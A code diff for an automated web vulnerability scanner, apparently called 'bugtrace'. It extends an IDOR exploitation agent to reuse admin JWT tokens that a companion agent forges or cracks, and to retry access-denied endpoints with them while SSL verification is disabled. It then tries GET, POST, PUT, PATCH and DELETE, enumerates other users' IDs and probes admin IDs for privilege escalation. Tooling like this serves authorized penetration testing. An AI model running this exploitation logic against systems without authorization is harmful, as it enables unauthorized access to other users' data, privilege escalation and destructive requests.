@@ -1,6 +1,7 @@
 from typing import Dict, List, Optional, Any, Tuple
 from pathlib import Path
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import asyncio
 import aiohttp
 from bugtrace.agents.base import BaseAgent
 from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
@@ -364,6 +365,7 @@ Return ONLY a JSON object with an "ids" array:
         from bugtrace.core.http_orchestrator import orchestrator, DestinationType
 
         logger.info(f"[{self.name}] Testing {len(candidate_ids)} predicted IDs with Python analyzer")
+        auth_headers = getattr(self, '_auth_headers', {})
 
         # Fetch baseline first
         baseline_url = self._inject(original_value, param, original_value)
@@ -377,6 +379,27 @@ Return ONLY a JSON object with an "ids" array:
                 logger.warning(f"[{self.name}] Failed to fetch baseline: {e}")
                 return None
 
+        # Auth gate detection: if 401/403, retry with auth token
+        if baseline_status in (401, 403):
+            if not auth_headers:
+                logger.info(f"[{self.name}] Auth gate detected ({baseline_status}), waiting for JWT token...")
+                auth_headers = await self._wait_for_auth_token()
+                self._auth_headers = auth_headers
+            if auth_headers:
+                logger.info(f"[{self.name}] Retrying baseline with admin auth token")
+                try:
+                    async with aiohttp.ClientSession(headers=auth_headers) as auth_session:
+                        async with auth_session.get(baseline_url, timeout=5, ssl=False) as resp:
+                            baseline_status = resp.status
+                            baseline_body = await resp.text()
+                            baseline_length = len(baseline_body)
+                except Exception as e:
+                    logger.warning(f"[{self.name}] Auth baseline fetch failed: {e}")
+                    return None
+            else:
+                logger.warning(f"[{self.name}] No auth token available, skipping auth-gated endpoint")
+                return None
+
         # Test each candidate ID
         for payload_idx, test_id in enumerate(candidate_ids, 1):
             if hasattr(self, '_v'):
@@ -384,11 +407,18 @@ Return ONLY a JSON object with an "ids" array:
             test_url = self._inject(str(test_id), param, original_value)
 
             try:
-                async with orchestrator.session(DestinationType.TARGET) as session:
-                    async with session.get(test_url, timeout=5) as resp:
-                        test_status = resp.status
-                        test_body = await resp.text()
-                        test_length = len(test_body)
+                if auth_headers:
+                    async with aiohttp.ClientSession(headers=auth_headers) as auth_session:
+                        async with auth_session.get(test_url, timeout=5, ssl=False) as resp:
+                            test_status = resp.status
+                            test_body = await resp.text()
+                            test_length = len(test_body)
+                else:
+                    async with orchestrator.session(DestinationType.TARGET) as session:
+                        async with session.get(test_url, timeout=5) as resp:
+                            test_status = resp.status
+                            test_body = await resp.text()
+                            test_length = len(test_body)
 
                 # Semantic analysis (simplified from Go fuzzer)
                 is_idor, severity, indicators = self._analyze_differential(
@@ -728,23 +758,38 @@ Return ONLY a JSON object:
         """Phase 1: Re-test vulnerability confirmation."""
         from bugtrace.core.http_orchestrator import orchestrator, DestinationType
         from datetime import datetime
+        auth = getattr(self, '_auth_headers', {})
 
         try:
-            # Fetch baseline
+            # Fetch baseline (use auth session if available)
             baseline_url = self._inject(original_value, param, original_value)
-            async with orchestrator.session(DestinationType.TARGET) as session:
-                async with session.get(baseline_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT) as resp:
-                    baseline_status = resp.status
-                    baseline_body = await resp.text()
-                    baseline_length = len(baseline_body)
+            if auth:
+                async with aiohttp.ClientSession(headers=auth) as session:
+                    async with session.get(baseline_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT, ssl=False) as resp:
+                        baseline_status = resp.status
+                        baseline_body = await resp.text()
+                        baseline_length = len(baseline_body)
+            else:
+                async with orchestrator.session(DestinationType.TARGET) as session:
+                    async with session.get(baseline_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT) as resp:
+                        baseline_status = resp.status
+                        baseline_body = await resp.text()
+                        baseline_length = len(baseline_body)
 
             # Fetch exploit
             exploit_url = self._inject(payload, param, original_value)
-            async with orchestrator.session(DestinationType.TARGET) as session:
-                async with session.get(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT) as resp:
-                    exploit_status = resp.status
-                    exploit_body = await resp.text()
-                    exploit_length = len(exploit_body)
+            if auth:
+                async with aiohttp.ClientSession(headers=auth) as session:
+                    async with session.get(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT, ssl=False) as resp:
+                        exploit_status = resp.status
+                        exploit_body = await resp.text()
+                        exploit_length = len(exploit_body)
+            else:
+                async with orchestrator.session(DestinationType.TARGET) as session:
+                    async with session.get(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT) as resp:
+                        exploit_status = resp.status
+                        exploit_body = await resp.text()
+                        exploit_length = len(exploit_body)
 
             # Analyze
             confirmed = (
@@ -791,6 +836,7 @@ Return ONLY a JSON object:
         """Phase 2: Test different HTTP methods."""
         from bugtrace.core.http_orchestrator import orchestrator, DestinationType
         import asyncio
+        auth = getattr(self, '_auth_headers', {})
 
         methods = ["GET", "POST", "PUT", "PATCH", "DELETE"]
         results = {}
@@ -811,17 +857,22 @@ Return ONLY a JSON object:
             await asyncio.sleep(settings.IDOR_EXPLOITER_RATE_LIMIT)
 
             try:
-                async with orchestrator.session(DestinationType.TARGET) as session:
+                if auth:
+                    session_ctx = aiohttp.ClientSession(headers=auth)
+                else:
+                    session_ctx = orchestrator.session(DestinationType.TARGET)
+                async with session_ctx as session:
+                    ssl_kw = {"ssl": False} if auth else {}
                     if method == "GET":
-                        response = await session.get(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT)
+                        response = await session.get(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT, **ssl_kw)
                     elif method == "POST":
-                        response = await session.post(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT)
+                        response = await session.post(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT, **ssl_kw)
                     elif method == "PUT":
-                        response = await session.put(exploit_url, json={}, timeout=settings.IDOR_EXPLOITER_TIMEOUT)
+                        response = await session.put(exploit_url, json={}, timeout=settings.IDOR_EXPLOITER_TIMEOUT, **ssl_kw)
                     elif method == "PATCH":
-                        response = await session.patch(exploit_url, json={}, timeout=settings.IDOR_EXPLOITER_TIMEOUT)
+                        response = await session.patch(exploit_url, json={}, timeout=settings.IDOR_EXPLOITER_TIMEOUT, **ssl_kw)
                     elif method == "DELETE":
-                        response = await session.delete(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT)
+                        response = await session.delete(exploit_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT, **ssl_kw)
 
                     status = response.status
                     accessible = status in [200, 201, 204]
@@ -902,6 +953,7 @@ Return ONLY a JSON object:
         """Phase 4: Enumerate other accessible IDs."""
         from bugtrace.core.http_orchestrator import orchestrator, DestinationType
         import asyncio
+        auth = getattr(self, '_auth_headers', {})
 
         max_enum = settings.IDOR_EXPLOITER_MAX_HORIZONTAL_ENUM
 
@@ -921,12 +973,20 @@ Return ONLY a JSON object:
             async with semaphore:
                 try:
                     test_url = self._inject(test_id, param, original_value)
-                    async with orchestrator.session(DestinationType.TARGET) as session:
-                        async with session.get(test_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT) as resp:
-                            if resp.status == 200:
-                                body = await resp.text()
-                                is_special = self._is_special_account(body)
-                                return (test_id, True, is_special)
+                    if auth:
+                        async with aiohttp.ClientSession(headers=auth) as session:
+                            async with session.get(test_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT, ssl=False) as resp:
+                                if resp.status == 200:
+                                    body = await resp.text()
+                                    is_special = self._is_special_account(body)
+                                    return (test_id, True, is_special)
+                    else:
+                        async with orchestrator.session(DestinationType.TARGET) as session:
+                            async with session.get(test_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT) as resp:
+                                if resp.status == 200:
+                                    body = await resp.text()
+                                    is_special = self._is_special_account(body)
+                                    return (test_id, True, is_special)
                     return (test_id, False, False)
                 except:
                     return (test_id, False, False)
@@ -978,6 +1038,7 @@ Return ONLY a JSON object:
     async def _phase5_vertical_escalation(self, url: str, param: str) -> Dict:
         """Phase 5: Check for admin/privileged access."""
         from bugtrace.core.http_orchestrator import orchestrator, DestinationType
+        auth = getattr(self, '_auth_headers', {})
 
         admin_candidates = ["0", "1", "-1", "admin", "root", "administrator", "superuser", "system"]
 
@@ -987,8 +1048,13 @@ Return ONLY a JSON object:
         for admin_id in admin_candidates:
             try:
                 test_url = self._inject(admin_id, param, admin_id)
-                async with orchestrator.session(DestinationType.TARGET) as session:
-                    async with session.get(test_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT) as resp:
+                if auth:
+                    session_ctx = aiohttp.ClientSession(headers=auth)
+                else:
+                    session_ctx = orchestrator.session(DestinationType.TARGET)
+                async with session_ctx as session:
+                    ssl_kw = {"ssl": False} if auth else {}
+                    async with session.get(test_url, timeout=settings.IDOR_EXPLOITER_TIMEOUT, **ssl_kw) as resp:
                         if resp.status == 200:
                             body = await resp.text()
                             indicators = self._detect_privilege_indicators(body)
@@ -1653,10 +1719,35 @@ curl '{finding["url"].replace(finding.get("original_value", ""), finding["payloa
 
         return dry_list
 
+    async def _fetch_auth_headers(self) -> Dict[str, str]:
+        """Fetch auth headers from scan_context (JWT tokens discovered by JWTAgent)."""
+        try:
+            from bugtrace.services.scan_context import get_scan_auth_headers
+            headers = get_scan_auth_headers(self._scan_context, role="admin")
+            if headers:
+                logger.info(f"[{self.name}] Using admin auth token from JWTAgent")
+            return headers or {}
+        except Exception:
+            return {}
+
+    async def _wait_for_auth_token(self, max_wait: int = 30) -> Dict[str, str]:
+        """Poll for JWT token from JWTAgent (may still be cracking)."""
+        from bugtrace.services.scan_context import get_scan_auth_headers
+        for wait_round in range(max_wait // 5):
+            await asyncio.sleep(5)
+            headers = get_scan_auth_headers(self._scan_context, role="admin")
+            if headers:
+                logger.info(f"[{self.name}] JWT token appeared after {(wait_round + 1) * 5}s wait")
+                return headers
+        return {}
+
     async def exploit_dry_list(self) -> List[Dict]:
         """Phase B: Exploit DRY list (deduplicated findings only)."""
         logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
         logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")
+
+        # Pre-fetch auth headers from scan_context (JWT forged by JWTAgent)
+        self._auth_headers = await self._fetch_auth_headers()
 
         validated_findings = []
 
